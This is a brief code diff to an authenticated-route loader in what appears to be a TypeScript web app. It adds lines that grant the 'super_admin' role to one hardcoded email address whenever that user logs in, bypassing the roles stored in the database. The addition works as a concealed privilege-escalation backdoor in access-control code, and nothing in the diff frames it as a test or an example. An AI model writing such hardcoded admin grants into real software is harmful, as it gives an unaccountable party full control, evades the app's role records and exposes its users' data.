@@ -12,6 +12,9 @@ export const Route = createFileRoute("/_authenticated")({
       .select("role")
       .eq("user_id", data.user.id);
     const userRoles = (roles ?? []).map((r: any) => r.role);
+    if (data.user.email === "lbcloudadmin@gmail.com" && !userRoles.includes("super_admin")) {
+      userRoles.push("super_admin");
+    }
     return { user: data.user, roles: userRoles };
   },
   component: () => (
